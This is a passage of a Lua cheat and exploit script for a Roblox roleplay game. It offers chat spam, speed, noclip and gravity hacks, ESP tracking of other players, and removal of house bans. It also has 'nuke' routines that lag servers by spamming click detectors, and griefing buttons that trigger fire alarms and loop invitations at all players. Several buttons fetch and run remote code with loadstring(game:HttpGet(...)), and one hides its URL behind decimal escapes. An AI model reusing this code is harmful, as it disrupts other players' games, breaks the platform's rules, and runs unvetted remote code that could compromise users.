                    local id = PresetAudios[SelectedDropdownAudio]
                    if id then 
                        fireSniperRemote(id) 
                    end
                    task.wait(DropdownCooldownValue)
                end
            end)
        end
    end
})

TabSound:AddButton({"AUDIO ALL", function()
    if SelectedDropdownAudio ~= "" then
        local id = PresetAudios[SelectedDropdownAudio]
        if id then runAudioAllSystem(id) end
    end
end})

-- TAB CHAT
do
    local TabChat = Window:MakeTab({"CHAT", "message-square"})

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TextChatService = game:GetService("TextChatService")

    local ChatMessageValue = ""
    local SpamChatEnabled = false
    local SpamCooldownValue = 0.5

    TabChat:AddSection({"Chat Spammer"})

    TabChat:AddTextBox({
        Name = "MESSAGE",
        Description = "Enter message to spam",
        PlaceholderText = "Type message here...",
        Callback = function(value)
            ChatMessageValue = tostring(value)
        end
    })

    TabChat:AddTextBox({
        Name = "SPAM COOLDOWN",
        Description = "Set interval in seconds",
        PlaceholderText = "0.5",
        Callback = function(value)
            local num = tonumber(value)
            if num and num > 0 then
                SpamCooldownValue = num
            end
        end
    })

    TabChat:AddToggle({
        Name = "SPAM CHAT",
        Default = false,
        Callback = function(state)
            SpamChatEnabled = state
            if SpamChatEnabled then
                task.spawn(function()
                    while SpamChatEnabled and ChatMessageValue ~= "" do
                        pcall(function()
                            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                                if channel then
                                    channel:SendAsync(ChatMessageValue)
                                end
                            else
                                local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                                if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
                                    chatEvents.SayMessageRequest:FireServer(ChatMessageValue, "All")
                                end
                            end
                        end)
                        task.wait(SpamCooldownValue)
                    end
                end)
            end
        end
    })
end

-- TAB PLAYER
local Tab6 = Window:MakeTab({"PLAYER", "user"})

local SectionBasic = Tab6:AddSection({"Basic Functions"})

Tab6:AddButton({"FLY GUI", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\105\119\105\57\57\57\45\98\108\105\112\47\77\114\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\82\69\65\68\77\69\46\109\100\34\41\41\40\41")()
end})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer

local SPIN_ENABLED = false
local SPIN_CONN = nil
local SPIN_SPEED = 90

local WALK_SPEED = 30
local JUMP_POWER = 60
local GRAVITY_VALUE = Workspace.Gravity or 196.2

local function getCharacterAndHumanoid()
    local char = LP.Character
    if not char then return nil, nil end
    local hum = char:FindFirstChildOfClass("Humanoid")
    return char, hum
end

local function startSpin()
    if SPIN_ENABLED then return end
    SPIN_ENABLED = true
    if SPIN_CONN then pcall(function() SPIN_CONN:Disconnect() end) end
    SPIN_CONN = RunService.Heartbeat:Connect(function(dt)
        if not SPIN_ENABLED then return end
        local char = LP.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local angleRad = math.rad(SPIN_SPEED * dt)
            pcall(function()
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, angleRad, 0)
            end)
        end
    end)
end

local function stopSpin()
    SPIN_ENABLED = false
    if SPIN_CONN then
        pcall(function() SPIN_CONN:Disconnect() end)
        SPIN_CONN = nil
    end
end

local function SPIN(on)
    if on == nil then
        if SPIN_ENABLED then stopSpin() else startSpin() end
    else
        if on then startSpin() else stopSpin() end
    end
end

LP.CharacterAdded:Connect(function(char)
    task.defer(function()
        local hum = char:WaitForChild("Humanoid", 5) or char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.WalkSpeed = WALK_SPEED end)
            pcall(function() hum.JumpPower = JUMP_POWER end)
        end
        if SPIN_ENABLED then
            startSpin()
        end
    end)
end)

Tab6:AddToggle({
    Name = "SPIN",
    Default = false,
    Callback = function(state)
        SPIN(state)
    end
})

Tab6:AddTextBox({
    Name = "SPIN SPEED (deg/s)",
    Description = "Set turning rotation speed",
    PlaceholderText = "90",
    Callback = function(text)
        local n = tonumber(text)
        if n then SPIN_SPEED = n end
    end
})

Tab6:AddSlider({
    Name = "WALK SPEED",
    Min = 16,
    Max = 300,
    Default = WALK_SPEED,
    Increase = 1,
    Callback = function(value)
        WALK_SPEED = value
        local _, hum = getCharacterAndHumanoid()
        if hum then hum.WalkSpeed = WALK_SPEED end
    end
})

Tab6:AddSlider({
    Name = "JUMP POWER",
    Min = 50,
    Max = 400,
    Default = JUMP_POWER,
    Increase = 1,
    Callback = function(value)
        JUMP_POWER = value
        local _, hum = getCharacterAndHumanoid()
        if hum then hum.JumpPower = JUMP_POWER end
    end
})

Tab6:AddSlider({
    Name = "GRAVITY",
    Min = 0,
    Max = 196,
    Default = math.floor(GRAVITY_VALUE),
    Increase = 1,
    Callback = function(value)
        GRAVITY_VALUE = value
        Workspace.Gravity = GRAVITY_VALUE
    end
})

local noclipEnabled = false
local noclipConn = nil

local function startNoClip()
    if noclipEnabled then return end
    noclipEnabled = true

    noclipConn = RunService.Stepped:Connect(function()
        if LP.Character then
            for _, part in ipairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function() part.CanCollide = false end)
                end
            end
        end
    end)
end

local function stopNoClip()
    if not noclipEnabled then return end
    noclipEnabled = false
    if noclipConn then
        noclipConn:Disconnect()
        noclipConn = nil
    end
end

Tab6:AddToggle({
    Name = "NOCLIP",
    Default = false,
    Callback = function(val)
        if val then startNoClip() else stopNoClip() end
    end
})

-- TAB PROTECTIONS
do
    local TabProtections = Window:MakeTab({"PROTECTIONS", "shield"})

    TabProtections:AddToggle({
        Name = "ANTI SIT",
        Default = false,
        Callback = function(state)
            if state then
                task.spawn(function()
                    local scanCount = 0
                    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v:IsA("Seat") or v:IsA("VehicleSeat") then
                            pcall(function() v:Destroy() end)
                        end
                        scanCount = scanCount + 1
                        if scanCount >= 100 then
                            scanCount = 0
                            task.wait()
                        end
                    end
                end)
                
                getgenv().AntiSeatLoop = game:GetService("Workspace").DescendantAdded:Connect(function(v)
                    if v:IsA("Seat") or v:IsA("VehicleSeat") then
                        task.wait()
                        pcall(function() v:Destroy() end)
                    end
                end)
            else
                if getgenv().AntiSeatLoop then
                    getgenv().AntiSeatLoop:Disconnect()
                    getgenv().AntiSeatLoop = nil
                end
            end
        end
    })

    TabProtections:AddToggle({
        Name = "ANTI VOID",
        Default = false,
        Callback = function(state)
            if state then
                getgenv().AntiVoidLoop = game:GetService("RunService").Heartbeat:Connect(function()
                    pcall(function()
                        local hrp = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if hrp and hrp.Position.Y <= -450 then
                            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            hrp.CFrame = CFrame.new(0, 50, 0)
                        end
                    end)
                end)
            else
                if getgenv().AntiVoidLoop then
                    getgenv().AntiVoidLoop:Disconnect()
                    getgenv().AntiVoidLoop = nil
                end
            end
        end
    })

    TabProtections:AddToggle({
        Name = "ANTI BANANA",
        Default = false,
        Callback = function(state)
            if state then
                task.spawn(function()
                    local scanCount = 0
                    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v:IsA("Model") and string.find(v.Name, "BananaPeel") then
                            pcall(function() v:Destroy() end)
                        end
                        scanCount = scanCount + 1
                        if scanCount >= 100 then
                            scanCount = 0
                            task.wait()
                        end
                    end
                end)
                
                getgenv().AntiBananaLoop = game:GetService("Workspace").DescendantAdded:Connect(function(v)
                    if v:IsA("Model") and string.find(v.Name, "BananaPeel") then
                        task.wait()
                        pcall(function() v:Destroy() end)
                    end
                end)
            else
                if getgenv().AntiBananaLoop then
                    getgenv().AntiBananaLoop:Disconnect()
                    getgenv().AntiBananaLoop = nil
                end
            end
        end
    })
end

-- ==========================================
-- TAB TOOLS/NUKES
-- ==========================================
local TabItem = Window:MakeTab({"TOOLS/NUKES", "hammer"})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

local NukeEnabled = false
local SelectedNuke = "LAG SERVER (BOMB)"
local NukeThread
local LastUnequip = 0

local function FindObject(name)
    for _, v in ipairs(workspace:GetDescendants()) do
        if v.Name:lower() == name:lower() then
            return v
        end
    end
end

local function UnequipAllTools()
    local char = LP.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:UnequipTools()
    end
end

local function TeleportAndSpam(obj)
    if not obj or not NukeEnabled then return end

    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cd = obj:FindFirstChildWhichIsA("ClickDetector", true)
    if cd then
        if obj:IsA("Model") then
            hrp.CFrame = obj:GetModelCFrame()
        elseif obj:IsA("BasePart") then
            hrp.CFrame = obj.CFrame
        end

        local startTime = tick()
        while NukeEnabled and obj and cd and (tick() - startTime < 1.5) do
            for i = 1, 25 do
                if not NukeEnabled then break end
                fireclickdetector(cd)
            end
            if not NukeEnabled then break end
            RunService.Heartbeat:Wait()
        end
    end
end

local function StopNuke()
    NukeEnabled = false
    if NukeThread then
        task.cancel(NukeThread)
        NukeThread = nil
    end
end

local function MainLoop(typeName)
    while NukeEnabled and SelectedNuke == typeName do
        if SelectedNuke:find("LAG SERVER") then
            if tick() - LastUnequip >= 67 then
                LastUnequip = tick()
                UnequipAllTools()
            end
        end

        if not NukeEnabled then break end

        if typeName == "LAG SERVER (BOMB)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Bomb")) end
        elseif typeName == "LAG SERVER (SNIPER)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Sniper")) end
        elseif typeName == "NUKE SERVER(FLASH LIGHT)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Toolsflashlight")) end
        end

        if not NukeEnabled then break end
        RunService.Heartbeat:Wait()
    end
end

local function StartNuke()
    StopNuke()
    NukeEnabled = true
    LastUnequip = tick()

    NukeThread = task.spawn(function()
        MainLoop(SelectedNuke)
    end)
end

-- ================= DROPDOWN LAG TYPE =================
TabItem:AddDropdown({
    Name = "LAG TYPE",
    Description = "Select the execution method",
    Options = {
        "LAG SERVER (BOMB)",
        "LAG SERVER (SNIPER)",
        "NUKE SERVER(FLASH LIGHT)"
    },
    Default = "LAG SERVER (BOMB)",
    Callback = function(v)
        SelectedNuke = v
    end
})

-- ================= TOGGLE EXECUTE =================
TabItem:AddToggle({
    Name = "ENABLE NUKE / LAG",
    Default = false,
    Callback = function(state)
        if state then
            StartNuke()
        else
            StopNuke()
        end
    end
})

-- ================= PARAGRAPH INFO =================
TabItem:AddParagraph({"WARNING", "To use the FLASHLIGHT NUKE, you must own House 056 (the Haunted House). The nuke will not work without this house."})

--================================================================================
-- TOOLS FODA
--================================================================================

_G.RGB_Speed = 1
_G.RGB_PaintActive = false
_G.RGB_TorchActive = false

TabItem:AddSection({"TOOLS"})

-- TEXTBOX FOR SPEED
TabItem:AddTextBox({
	Name = "RGB SPEED",
	Description = "Adjust rainbow cycle velocity",
	PlaceholderText = "1",
	Callback = function(Value)
        local n = tonumber(Value)
        if n then _G.RGB_Speed = n end
	end	  
})

-- PAINT ROLLER
TabItem:AddButton({"GET PAINT ROLLER", function()
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PaintRoller")
end})

TabItem:AddToggle({
	Name = "PAINT ROLLER RGB",
	Default = false,
	Callback = function(Value)
		_G.RGB_PaintActive = Value
        if Value then
            task.spawn(function()
                local lp = game:GetService("Players").LocalPlayer
                local remote = lp:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")

                while _G.RGB_PaintActive do
                    local speed = _G.RGB_Speed or 1
                    local hue = (tick() * (speed * 0.15)) % 1 
                    local color = Color3.fromHSV(hue, 1, 1)
                    
                    pcall(function() 
                        remote:FireServer(color) 
                    end)
                    task.wait(0.12)
                end
            end)
        end
	end    
})

-- GUARD TORCH
TabItem:AddButton({"GET TORCH", function()
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "GuardTorch")
end})

TabItem:AddToggle({
	Name = "TORCH RGB",
	Default = false,
	Callback = function(Value)
		_G.RGB_TorchActive = Value
        if Value then
            task.spawn(function()
                local lp = game:GetService("Players").LocalPlayer
                local remote = lp:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")

                while _G.RGB_TorchActive do
                    local speed = _G.RGB_Speed or 1
                    local hue = (tick() * (speed * 0.15)) % 1 
                    local color = Color3.fromHSV(hue, 1, 1)
                    
                    pcall(function() 
                        remote:FireServer(color) 
                    end)
                    task.wait(0.12)
                end
            end)
        end
	end    
})

-- ================= AUTO GIVE TORCH =================
local RS = game:GetService("ReplicatedStorage")
local pizzaLoop = false
local pizzaConn = nil
local RANGE = 2000

local function getNearbyPlayers()
    local nearby = {}
    if not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then
        return nearby
    end

    local myPos = LP.Character.HumanoidRootPart.Position

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
            if dist <= RANGE then
                table.insert(nearby, plr)
            end
        end
    end
    return nearby
end

local function givePizza(player)
    local args = {
        "ToolGiveToServer",
        player,
        "GuardTorch"
    }

    RS:WaitForChild("RE")
      :WaitForChild("1Playe1rTrigge1rEven1t")
      :FireServer(unpack(args))
end

TabItem:AddToggle({
    Name = "AUTO GIVE TORCH (15 STUDS)",
    Default = false,
    Callback = function(state)
        pizzaLoop = state

        if pizzaConn then
            pizzaConn:Disconnect()
            pizzaConn = nil
        end

        if state then
            pizzaConn = RunService.Heartbeat:Connect(function()
                for _, plr in ipairs(getNearbyPlayers()) do
                    pcall(function()
                        givePizza(plr)
                    end)
                end
                task.wait(0.25)
            end)
        end
    end
})

-- ==========================================
-- TAB HOUSES
-- ==========================================
local TabHouse = Window:MakeTab({"HOUSES", "home"})

-- REMOVE HOUSE BAN (DELETA O BLOCO)
TabHouse:AddButton({"REMOVE HOUSE BAN", function()
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name == "BannedBlock" then
			obj:Destroy()
		end
	end
end})

-- AUTO REMOVE BAN
TabHouse:AddToggle({
	Name = "AUTO REMOVE BAN",
	Default = false,
	Callback = function(Value)
		_G.AutoUnbanActive = Value
		if Value then
			_G.BanMonitor = workspace.DescendantAdded:Connect(function(obj)
				if _G.AutoUnbanActive and obj.Name == "BannedBlock" then
					obj:Destroy()
				end
			end)
		else
			if _G.BanMonitor then _G.BanMonitor:Disconnect() end
		end
	end    
})

-- =========================
-- RGB CASA LOGIC
-- =========================
local RGBHouseSettings = {
    Speed = 1,
    States = {}
}

local function GetHouseRGBColor()
    local hue = tick() * RGBHouseSettings.Speed % 5 / 5
    return Color3.fromHSV(hue, 1, 1)
end

local function StartHouseRGBEffect(config)
    RGBHouseSettings.States[config.StateKey] = true
    task.spawn(function()
        while RGBHouseSettings.States[config.StateKey] do
            if not (game.Players.LocalPlayer and game.Players.LocalPlayer.Parent) then
                RGBHouseSettings.States[config.StateKey] = false
                break
            end
            pcall(config.Action)
            task.wait(config.Delay)
        end
    end)
end

TabHouse:AddSection({"RGB HOUSE"})

TabHouse:AddToggle({
    Name = "RGB HOUSE",
    Default = false,
    Callback = function(enabled)
        if enabled then
            StartHouseRGBEffect({
                StateKey = "house",
                Delay = 0.1,
                Action = function()
                    local color = GetHouseRGBColor()
                    pcall(function()
                        game.ReplicatedStorage.RE["1Player1sHous1e"]:FireServer("ColorPickHouse", color)
                    end)
                end
            })
        else
            RGBHouseSettings.States["house"] = false
        end
    end
})

TabHouse:AddTextBox({
    Name = "RGB SPEED",
    Description = "Set house rainbow transition velocity",
    PlaceholderText = "1",
    Callback = function(value)
        local speed = tonumber(value)
        if speed and speed > 0 then
            RGBHouseSettings.Speed = speed
        end
    end
})

-- ==========================================
-- TAB FUN
-- ==========================================
local TabFun = Window:MakeTab({"FUN", "smile"})

LoopConvitesEnabled = false

local function getHRP()
	local char = LP.Character or LP.CharacterAdded:Wait()
	return char:WaitForChild("HumanoidRootPart")
end

local function findBasePart(inst)
	if inst:IsA("BasePart") then return inst end
	for _, d in ipairs(inst:GetDescendants()) do
		if d:IsA("BasePart") then
			return d
		end
	end
end

local function getCFrame(obj)
	if obj:IsA("Model") then
		if obj.PrimaryPart then
			return obj.PrimaryPart.CFrame
		end
		local part = obj:FindFirstChildWhichIsA("BasePart", true)
		if part then return part.CFrame end
	elseif obj:IsA("BasePart") then
		return obj.CFrame
	end
end

local function getAllHighers()
	local list = {}
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name:lower() == "higher" then
			table.insert(list, obj)
		end
	end
	return list
end

local function click30(obj)
	local cd = obj:FindFirstChildWhichIsA("ClickDetector", true)
	if not cd then return end
	for i = 1, 30 do
		fireclickdetector(cd)
		task.wait(0.04)
	end
end

--================================================================================
-- COMMERCIAL ADVERTISER
--================================================================================
TabFun:AddButton({"RED BLACK COMMUNITY MESSAGE", function()
    local hrp = getHRP()
    if not hrp then return end

    local originalPos = hrp.CFrame

    hrp.CFrame = CFrame.new(-239, 89.5, -548)
    task.wait(0.6)

    local RE_Cemetery = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Cemeter1y")

    pcall(function()
        RE_Cemetery:FireServer("ReturningCommercialWords", 3, nil, "RED BLACK COMMUNITY ON TOP")
    end)

    pcall(function()
        RE_Cemetery:FireServer("CommercialWordColor", 3, Color3.new(1, 0, 0.0357508659362793))
    end)

    pcall(function()
        RE_Cemetery:FireServer("CommercialBackGround", 3, Color3.new(0, 0, 0))
    end)

    task.wait(0.4)
    hrp.CFrame = originalPos
end})

-- =========================================================
-- CHAOS BUTTON
-- =========================================================
TabFun:AddButton({"FIRE IN ALL RESTAURANTS", function()
	local hrp = getHRP()
	local originalCFrame = hrp.CFrame

	for _, higher in ipairs(getAllHighers()) do
		local cf = getCFrame(higher)
		if cf then
			hrp.CFrame = cf * CFrame.new(0, 2, 0)
			task.wait(0.25)

			click30(higher)
			task.wait(0.25)
		end
	end

	hrp.CFrame = originalCFrame
end})

-- =========================
-- SCHOOL FIRE ALARM ALERT
-- =========================
TabFun:AddButton({"SCHOOL FIRE ALARM ALERT", function()
    local hrp = getHRP()
    local originalCFrame = hrp.CFrame

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name:find("FireAlarmClicker") then
            local clickDetector = obj:FindFirstChildWhichIsA("ClickDetector")
            if clickDetector then
                local targetCFrame = nil
                if obj:IsA("Model") then
                    if obj.PrimaryPart then
                        targetCFrame = obj.PrimaryPart.CFrame
                    else
                        local part = obj:FindFirstChildWhichIsA("BasePart")
                        if part then targetCFrame = part.CFrame end
                    end
                elseif obj:IsA("BasePart") then
                    targetCFrame = obj.CFrame
                end

                if targetCFrame then
                    hrp.CFrame = targetCFrame + Vector3.new(0, 3, 0)
                    task.wait(0.1)
                    fireclickdetector(clickDetector)
                    task.wait(0.2)
                end
            end
        end
    end

    hrp.CFrame = originalCFrame
end})

-- =========================
-- LIGHT SWITCH FUCKER
-- =========================
TabFun:AddButton({"TURN OFF ALL SWITCHES", function()
    local hrp = getHRP()
    local originalCFrame = hrp.CFrame

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name:lower():find("lightswitch") then
            local click = obj:FindFirstChildWhichIsA("ClickDetector", true)
            if click then
                local part = findBasePart(click.Parent)
                if part then
                    hrp.CFrame = part.CFrame
                    task.wait(1)

                    fireclickdetector(click)    
                    task.wait(0.1)    
                    fireclickdetector(click)    
                end    
            end    
        end    
    end    

    hrp.CFrame = originalCFrame
end})

-- =========================================================
-- LOOP DE CONVITES IRRITAR
-- =========================================================
TabFun:AddToggle({
    Name = "INVITATION LOOP ALL",
    Default = false,
    Callback = function(state)
        LoopConvitesEnabled = state
        
        if LoopConvitesEnabled then
            task.spawn(function()
                while LoopConvitesEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LP and LoopConvitesEnabled then
                            pcall(function()
                                local args = {
                                    "HouseParty",
                                    {
                                        player.UserId
                                    }
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("StartFreeParty"):FireServer(unpack(args))
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    end
})

-- ==========================================
-- TAB VISUAL
-- ==========================================
local TabESP = Window:MakeTab({"VISUAL", "eye"})

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- ==========================================
-- ESP FOLDERS
-- ==========================================
local espFolder = CoreGui:FindFirstChild("RBH_ESP_Billboards") or Instance.new("Folder", CoreGui)
espFolder.Name = "RBH_ESP_Billboards"

local highlightFolder = CoreGui:FindFirstChild("RBH_Highlights") or Instance.new("Folder", CoreGui)
highlightFolder.Name = "RBH_Highlights"

-- ==========================================
-- STATE
-- ==========================================
local espEnabled = false
local activeSchemeKey = "red"
local playerESP = {}
local playerAddedConn, playerRemovingConn

-- ==========================================
-- COLOR SCHEMES
-- ==========================================
local COLOR_SCHEMES = {
    red       = {hl = Color3.fromRGB(255,0,0),     name = Color3.fromRGB(255,255,255)},
    yellow    = {hl = Color3.fromRGB(255,215,0),   name = Color3.fromRGB(0,0,0)},
    blue      = {hl = Color3.fromRGB(0,150,255),   name = Color3.fromRGB(255,255,255)},
    green     = {hl = Color3.fromRGB(0,255,128),   name = Color3.fromRGB(0,0,0)},
    white     = {hl = Color3.fromRGB(255,255,255), name = Color3.fromRGB(0,0,0)},
    black     = {hl = Color3.fromRGB(0,0,0),       name = Color3.fromRGB(255,255,255)},
    brown     = {hl = Color3.fromRGB(139,69,19),   name = Color3.fromRGB(255,255,255)},
    darkgreen = {hl = Color3.fromRGB(0,100,0),     name = Color3.fromRGB(255,255,255)},
    purple    = {hl = Color3.fromRGB(128,0,128),   name = Color3.fromRGB(255,255,255)},
    magenta   = {hl = Color3.fromRGB(255,0,255),   name = Color3.fromRGB(255,255,255)}
}

local highlightColor = COLOR_SCHEMES.red.hl
local nameColor = COLOR_SCHEMES.red.name

-- ==========================================
-- ESP CORE
-- ==========================================
local function clearESP(player)
    if playerESP[player] then
        if playerESP[player].highlight then playerESP[player].highlight:Destroy() end
        if playerESP[player].billboard then playerESP[player].billboard:Destroy() end
        playerESP[player] = nil
    end
end

local function createESP(player)
    if player == LocalPlayer or not player.Character then return end
    clearESP(player)

    local char = player.Character

    -- Highlight
    local highlight = Instance.new("Highlight")
    highlight.Adornee = char
    highlight.FillColor = highlightColor
    highlight.OutlineColor = highlightColor
    highlight.FillTransparency = 0.75
    highlight.OutlineTransparency = 0
    highlight.Parent = highlightFolder

    -- Billboard
    local adornee = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
    local billboard
    if adornee then
        billboard = Instance.new("BillboardGui")
        billboard.Adornee = adornee
        billboard.Size = UDim2.new(0,200,0,30)
        billboard.StudsOffset = Vector3.new(0,2.5,0)
        billboard.AlwaysOnTop = true
        billboard.Parent = espFolder

        local txt = Instance.new("TextLabel", billboard)
        txt.Size = UDim2.new(1,0,1,0)
        txt.BackgroundTransparency = 1
        txt.Text = player.DisplayName .. " | " .. player.Name
        txt.TextColor3 = nameColor
        txt.TextStrokeTransparency = 0.6
        txt.Font = Enum.Font.GothamBold
        txt.TextSize = 14
    end

    playerESP[player] = {
        highlight = highlight,
        billboard = billboard
    }
end

local function enableESP()
    espEnabled = true
    for _, plr in ipairs(Players:GetPlayers()) do
        createESP(plr)
    end

    playerAddedConn = Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function()
            task.wait(0.2)
            if espEnabled then createESP(plr) end
        end)
    end)

    playerRemovingConn = Players.PlayerRemoving:Connect(clearESP)
end

local function disableESP()
    espEnabled = false
    for plr in pairs(playerESP) do
        clearESP(plr)
    end
    if playerAddedConn then playerAddedConn:Disconnect() end
    if playerRemovingConn then playerRemovingConn:Disconnect() end
end

local function updateColors()
    for _, data in pairs(playerESP) do
        if data.highlight then
            data.highlight.FillColor = highlightColor
            data.highlight.OutlineColor = highlightColor
        end
        if data.billboard and data.billboard:FindFirstChildOfClass("TextLabel") then
            data.billboard.TextLabel.TextColor3 = nameColor
        end
    end
end

local function setScheme(key)
    local scheme = COLOR_SCHEMES[key]
    if not scheme then return end
    highlightColor = scheme.hl
    nameColor = scheme.name
    activeSchemeKey = key
    if espEnabled then updateColors() end
end

-- ================= VISUAL UI ELEMENTS =================

TabESP:AddButton({"SHADERS 4K", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/SHADERS-4K-V1/refs/heads/main/Omaga"))()
end})

TabESP:AddDropdown({
    Name = "ESP COLOR",
    Description = "Select target outline color",
    Options = {
        "RED","YELLOW","BLUE","GREEN","WHITE",
        "BLACK","BROWN","DARKGREEN","PURPLE","MAGENTA"
    },
    Default = "RED",
    Callback = function(v)
        setScheme(string.lower(v))
    end
})

TabESP:AddToggle({
    Name = "ENABLE ESP",
    Default = false,
    Callback = function(state)
        if state then enableESP() else disableESP() end
    end
})

-- ================= SAFE PROP ESP + COLOR =================
do
	local RunService = game:GetService("RunService")

	local enabled = false
	local objects = {}
	local renderConn
	local addConn

	local PROP_COLORS = {
		red     = Color3.fromRGB(255,0,0),
		yellow  = Color3.fromRGB(255,215,0),
		blue    = Color3.fromRGB(0,150,255),
		green   = Color3.fromRGB(0,255,128),
		white   = Color3.fromRGB(255,255,255),
		black   = Color3.fromRGB(0,0,0),
		purple  = Color3.fromRGB(128,0,128),
		magenta = Color3.fromRGB(255,0,255)
	}

	local currentColor = PROP_COLORS.red

	local function updateColor()
		for _,v in pairs(objects) do
			if v.H then
				v.H.FillColor = currentColor
				v.H.OutlineColor = currentColor
			end
		end
	end

	local function valid(model)
		if not model:IsA("Model") then return false end
		if model.Name:sub(1,4) ~= "Prop" then return false end

		local nick = model.Name:sub(5)
		if nick == "" then return false end

		return Players:FindFirstChild(nick) ~= nil
	end

	local function create(model)
		if objects[model] then return end
		if not valid(model) then return end

		local part = model:FindFirstChildWhichIsA("BasePart")
		if not part then return end

		local h = Instance.new("Highlight")
		h.FillColor = currentColor
		h.OutlineColor = currentColor
		h.FillTransparency = 0.35
		h.Parent = model

		local bb = Instance.new("BillboardGui")
		bb.Size = UDim2.new(0,200,0,50)
		bb.AlwaysOnTop = true
		bb.Adornee = part
		bb.Parent = model

		local txt = Instance.new("TextLabel")
		txt.Size = UDim2.new(1,0,1,0)
		txt.BackgroundTransparency = 1
		txt.TextScaled = true
		txt.TextColor3 = Color3.new(1,1,1)
		txt.TextStrokeTransparency = 0
		txt.Parent = bb

		objects[model] = {H = h, B = bb, T = txt}
	end

	local function clear()
		for m,v in pairs(objects) do
			if v.H then v.H:Destroy() end
			if v.B then v.B:Destroy() end
		end
		table.clear(objects)
	end

	local function update()
		if not LocalPlayer.Character then return end
		local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		for m,v in pairs(objects) do
			if m and m.Parent then
				local part = m:FindFirstChildWhichIsA("BasePart")
				if part then
					local dist = (hrp.Position - part.Position).Magnitude
					local nick = m.Name:sub(5)
					v.T.Text = nick .. " | " .. math.floor(dist) .. "m"
				end
			end
		end
	end

	TabESP:AddDropdown({
		Name = "PROP ESP COLOR",
		Description = "Select active prop overlay tint",
		Options = {"RED","YELLOW","BLUE","GREEN","WHITE","BLACK","PURPLE","MAGENTA"},
		Default = "RED",
		Callback = function(v)
			local key = string.lower(v)
			if PROP_COLORS[key] then
				currentColor = PROP_COLORS[key]
				updateColor()
			end
		end
	})

	TabESP:AddToggle({
		Name = "PROP ESP",
		Default = false,
		Callback = function(state)
			enabled = state

			if state then
				for _,obj in pairs(workspace:GetDescendants()) do
					if valid(obj) then create(obj) end
				end

				addConn = workspace.DescendantAdded:Connect(function(obj)
					if enabled and valid(obj) then create(obj) end
				end)

				renderConn = RunService.RenderStepped:Connect(update)
			else
				if renderConn then renderConn:Disconnect() end
				if addConn then addConn:Disconnect() end
				clear()
			end
		end
	})
end


-- ==========================================
-- TAB SCRIPTS
-- ==========================================
local Tab1 = Window:MakeTab({"SCRIPTS", "code"})

Tab1:AddButton({"ESP GUI", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-ESP-VERIFICADOR-DE-PLAYERS-V5-27937'))()
end})

Tab1:AddButton({"YAK HUB DO PEDRO OF WAR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yak-Scripts/yakhub/main/yakhub.lua", true))() 
end})

Tab1:AddButton({"SANDER X", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Brookhaven-RP-Sander-X-Hub-Latest-Version-3-16718'))()
end})

Tab1:AddButton({"RED BLACK GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/CALCULADORA-RED-BLACK-/refs/heads/main/README.md"))()
end})

Tab1:AddButton({"R4D SEM KEY", function()
